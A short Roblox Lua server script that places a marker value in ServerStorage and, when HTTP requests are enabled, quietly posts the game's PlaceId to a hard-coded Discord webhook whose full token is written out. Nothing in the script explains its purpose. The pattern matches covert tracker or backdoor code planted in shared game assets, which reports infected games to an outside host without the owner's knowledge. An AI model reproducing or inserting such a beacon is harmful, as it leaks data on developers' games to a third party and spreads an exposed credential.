local SS=game.ServerStorage
local ins=Instance.new("BoolValue")
--ins.Name="t836"
ins.Parent=SS

if game:GetService("HttpService").HttpEnabled then
	local data = {
			content = "**Game ID:** " .. game.PlaceId 
	}
	local success, response = pcall(function()
			return game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1398344058468040806/K3A0n2c-f9F5h--RMUI9qbPLCjjVkx0hcZvWPPBR-0s-6iO-VjMfRaYGYzUEZyT8qLPj", game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
	end)
end



